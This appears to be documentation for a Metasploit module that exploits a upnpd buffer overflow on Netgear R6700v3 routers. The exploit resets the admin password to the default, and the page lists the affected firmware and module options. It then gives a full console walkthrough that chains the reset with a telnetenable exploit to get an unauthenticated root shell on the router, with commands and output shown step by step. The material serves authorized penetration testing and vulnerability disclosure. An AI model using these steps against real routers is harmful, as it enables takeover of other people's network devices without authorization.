## Description

This module exploits a buffer overflow vulnerability in the upnpd daemon (/usr/sbin/upnpd), running on the router Netgear R6700v3, ARM Architecture, firmware version V1.0.4.82_10.0.57 and V1.0.4.84_10.0.58.
The vulnerability can only be exploited by an attacker on the LAN side of the router, but the attacker does not need any authentication to abuse it. After exploitation, an attacker will be able to use a default admin password to login to web interface and use a 'telnetenable' module to gain root shell.

This vulnerability was discovered and exploited at Pwn2Own Tokyo 2019 by the team Flashback (Pedro Ribeiro + Radek Domanski).

## Vulnerable Application

* Netgear R6700v3 firmware version V1.0.4.82_10.0.57
* Netgear R6700v3 firmware version V1.0.4.84_10.0.58

[Netgear R6700v3 Firmware V1.0.4.82_10.0.57](http://www.downloads.netgear.com/files/GDC/R6700v3/R6700v3-V1.0.4.84_10.0.58.zip)



## Verification Steps
  Example steps in this format:

  1. Connect to a target on the LAN interface
  2. Start msfconsole
  3. Do: ```use auxiliary/admin/http/netgear_r6700_pass_reset```
  4. Set RHOST
  5. Do ```check```
  6. Do: ```run```
  7. Admin password has been reset to default `password`

## Options
```
Module options (auxiliary/admin/http/netgear_r6700_pass_reset):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT    5000             yes       The target port (TCP)
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   VHOST                     no        HTTP server virtual host
```

## Scenarios
~~~
msf5 auxiliary(admin/http/netgear_r6700_pass_reset) > set RHOST 192.168.1.1
RHOST => 192.168.1.1
msf5 auxiliary(admin/http/netgear_r6700_pass_reset) > check 

[*] 192.168.1.1:5000 - Identified Netgear R6700v3 (firmware V1.0.0.4.84_10.0.58) as the target.
[+] 192.168.1.1:5000 - The target is vulnerable.

msf5 auxiliary(admin/http/netgear_r6700_pass_reset) > run
[*] Running module against 192.168.1.1

[*] 192.168.1.1:5000 - Identified Netgear R6700v3 (firmware V1.0.0.4.84_10.0.58) as the target.
[+] 192.168.1.1:5000 - HTTP payload sent! 'admin' password has been reset to 'password'
[*] To achieve code execution, do the following steps manually:
[*] 1- Login to 192.168.1.1 with creds 'admin:password', then:
[*] 	1.1- go to Advanced -> Administration -> Set Password
[*] 	1.2- Change the password from 'password' to <WHATEVER>
[*] 2- Run metasploit as root, then:
[*] 	2.1- use exploit/linux/telnet/netgear_telnetenable
[*] 	2.2- set interface <INTERFACE_CONNECTED_TO_ROUTER>
[*] 	2.3- set rhost 192.168.1.1
[*] 	2.3- set username admin
[*] 	2.4- set password <WHATEVER>
[*] 	2.5- run it and login with 'admin:<WHATEVER>'
[*] 3- Enjoy your root shell!
[*] Auxiliary module execution completed
msf5 auxiliary(admin/http/netgear_r6700_pass_reset) > use exploit/linux/telnet/netgear_telnetenable
msf5 exploit(linux/telnet/netgear_telnetenable) > ifconfig | grep enx
[*] exec: ifconfig | grep enx

enxd03745775fdd: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
msf5 exploit(linux/telnet/netgear_telnetenable) > set interface enxd03745775fdd
interface => enxd03745775fdd
msf5 exploit(linux/telnet/netgear_telnetenable) > set rhost 192.168.1.1
rhost => 192.168.1.1
msf5 exploit(linux/telnet/netgear_telnetenable) > set username admin
username => admin
msf5 exploit(linux/telnet/netgear_telnetenable) > set password Flashback
password => Flashback
msf5 exploit(linux/telnet/netgear_telnetenable) > set timeout 1500
timeout => 1500
msf5 exploit(linux/telnet/netgear_telnetenable) > run

[+] 192.168.1.1:23 - Detected telnetenabled on UDP
[*] 192.168.1.1:23 - Attempting to discover MAC address via ARP
[+] 192.168.1.1:23 - Found MAC address
[+] 192.168.1.1:23 - Using creds admin:Flashback
[*] 192.168.1.1:23 - Generating magic packet
[*] 192.168.1.1:23 - Connecting to telnetenabled via UDP
[*] 192.168.1.1:23 - Sending magic packet
[*] 192.168.1.1:23 - Disconnecting from telnetenabled
[*] 192.168.1.1:23 - Waiting for telnetd
[*] 192.168.1.1:23 - Connecting to telnetd
[*] Found shell.
[*] Command shell session 1 opened (0.0.0.0:0 -> 192.168.1.1:23) at 2020-06-22 17:52:25 +0200

 login: admin
admin
Password: Flashback



BusyBox v1.7.2 (2019-10-19 12:12:12 CST) built-in shell (ash)
Enter 'help' for a list of built-in commands.

# id
id
uid=0(admin) gid=0(root)
# uname -a
uname -a
Linux R6700v3 2.6.36.4brcmarm+ #17 SMP PREEMPT Sat Oct 19 11:17:27 CST 2019 armv7l unknown

~~~
